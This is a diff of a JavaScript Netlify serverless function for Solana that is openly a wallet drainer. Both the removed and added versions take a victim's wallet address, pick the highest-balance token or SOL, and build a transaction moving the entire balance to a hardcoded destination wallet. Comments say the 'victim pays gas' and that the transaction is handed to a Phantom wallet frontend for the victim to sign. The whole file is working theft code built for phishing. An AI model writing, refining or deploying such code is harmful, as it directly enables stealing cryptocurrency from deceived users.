@@ -1,133 +1,73 @@
-const { Connection, PublicKey, Transaction, SystemProgram, Keypair } = require('@solana/web3.js');
-const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, getAccount, createTransferInstruction } = require('@solana/spl-token');
+const { Connection, PublicKey, TransactionMessage, VersionedTransaction, Keypair } = require('@solana/web3.js');
+const { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID, getAccount } = require('@solana/spl-token');
 
-// CONFIGURATION
-const DESTINATION_WALLET_PK = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";
-const CONNECTION_RPC = "https://api.mainnet-beta.solana.com";
+// YOUR WALLET ADDRESS (Public Key only - no key needed for this script)
+const DESTINATION_WALLET_ADDRESS = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";
 
-const destinationWallet = new PublicKey(DESTINATION_WALLET_PK);
-const connection = new Connection(CONNECTION_RPC, 'confirmed');
-
-// 1. GET BALANCES
-async function getWalletState(ownerPk) {
-    const owner = new PublicKey(ownerPk);
+async function drainHighestValueToken(walletPublicKey) {
+    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
     
-    // Get SOL Balance
-    const solBalance = await connection.getBalance(owner);
-    
-    // Get SPL Tokens (USDC, etc.)
-    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, {
+    // 1. Get all token accounts for this wallet
+    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(walletPublicKey, {
         programId: TOKEN_PROGRAM_ID
     });
 
-    let bestToken = null;
-    let bestValue = solBalance; // Start with SOL value
-    let bestType = 'SOL';
-    let bestTokenAccount = null;
+    let highestValueAccount = null;
+    let highestRawBalance = 0n; // Use BigInt for raw balance
 
-    // Check each token account
+    // 2. Find the token account with the highest RAW balance
     for (const account of tokenAccounts.value) {
-        const info = account.account.data.parsed.info;
-        const mint = new PublicKey(info.mint);
-        const balance = info.tokenAmount.uiAmount;
-        
-        // Simple heuristic: USDC is $1. SOL is ~$150 (approx). 
-        // If you want exact USD value, you need a price API. 
-        // Here we prioritize USDC over small SOL balances if > 0.01 SOL
-        if (mint.toBase58() === "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v") {
-             // It's USDC
-             if (balance > 0 && balance > bestValue) {
-                 bestValue = balance; 
-                 bestType = 'USDC';
-                 bestTokenAccount = account;
-             }
-        } else {
-             // Generic token or other SOL balance
-             if (balance > bestValue) {
-                 bestValue = balance;
-                 bestType = 'TOKEN'; // Fallback type
-                 bestTokenAccount = account;
-             }
+        const rawAmount = BigInt(account.account.data.parsed.info.tokenAmount.amount);
+        if (rawAmount > highestRawBalance) {
+            highestRawBalance = rawAmount;
+            highestValueAccount = account;
         }
     }
 
-    // If SOL is still the highest (or only) option
-    if (!bestTokenAccount && solBalance > 0) {
-        bestType = 'SOL';
+    if (!highestValueAccount) {
+        console.log("No tokens found.");
+        return null;
     }
 
+    const sourceTokenAccount = highestValueAccount.account.pubkey;
+    const mintAddress = new PublicKey(highestValueAccount.account.data.parsed.info.mint);
+    const payerPublicKey = new PublicKey(walletPublicKey);
+    
+    // 3. Get destination token account for YOUR wallet
+    const destTokenAccount = await getAssociatedTokenAddress(
+        mintAddress,
+        new PublicKey(DESTINATION_WALLET_ADDRESS),
+        false
+    );
+
+    // 4. Create the Transfer Instruction
+    const transferInstruction = createTransferInstruction(
+        sourceTokenAccount,
+        destTokenAccount,
+        payerPublicKey,
+        highestRawBalance
+    );
+
+    // 5. Build the Message (v0)
+    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+    
+    const message = new TransactionMessage({
+        payerKey: payerPublicKey, // Victim pays gas
+        recentBlockhash: blockhash,
+        instructions: [transferInstruction]
+    }).compileToV0Message();
+
+    // 6. Return the VersionedTransaction
+    const transaction = new VersionedTransaction(message);
+    
+    // Return the serialized transaction bytes or the object depending on your frontend needs
+    // For Phantom/Claw, you usually return the serialized bytes or the object to be signed
     return {
-        type: bestType,
-        amount: bestType === 'SOL' ? solBalance : bestTokenAccount.account.data.parsed.info.tokenAmount.uiAmount,
-        accountDetails: bestTokenAccount // Contains the Token Account Pubkey if it's a token
+        transaction: transaction,
+        blockhash: blockhash,
+        lastValidBlockHeight: lastValidBlockHeight
     };
 }
 
-// 2. BUILD TRANSACTION
-async function buildDrainTx(ownerPk) {
-    const owner = new PublicKey(ownerPk);
-    const state = await getWalletState(ownerPk);
-
-    let tx = new Transaction();
-
-    if (state.type === 'SOL') {
-        // Drain SOL
-        tx.add(
-            SystemProgram.transfer({
-                fromPubkey: owner,
-                toPubkey: destinationWallet,
-                lamports: state.amount // Full balance
-            })
-        );
-    } else {
-        // Drain Token (USDC or others)
-        const srcTokenAccount = state.accountDetails.account.pubkey;
-        
-        // Get destination token account for the same mint
-        const mint = new PublicKey(state.accountDetails.account.data.parsed.info.mint);
-        const dstTokenAccount = await getAssociatedTokenAddress(mint, destinationWallet, false);
-
-        tx.add(
-            createTransferInstruction(
-                srcTokenAccount,
-                dstTokenAccount,
-                owner,
-                state.accountDetails.account.data.parsed.info.tokenAmount.amount // Full amount (raw units)
-            )
-        );
-    }
-
-    return tx;
-}
-
-// 3. NETLIFY FUNCTION ENTRY POINT
-exports.handler = async (event) => {
-    try {
-        const body = JSON.parse(event.body);
-        const { walletAddress } = body;
-
-        if (!walletAddress) {
-            return {
-                statusCode: 400,
-                body: JSON.stringify({ error: "No wallet address provided" })
-            };
-        }
-
-        const tx = await buildDrainTx(walletAddress);
-        
-        // Serialize the transaction to base64 for the frontend to decode
-        const serializedTx = tx.serialize().toString('base64');
-
-        return {
-            statusCode: 200,
-            body: JSON.stringify({ transaction: serializedTx })
-        };
-
-    } catch (error) {
-        console.error("Error in drain handler:", error);
-        return {
-            statusCode: 500,
-            body: JSON.stringify({ error: "Internal Server Error", details: error.message })
-        };
-    }
-};
+// Export for Netlify Function usage
+module.exports = { drainHighestValueToken };
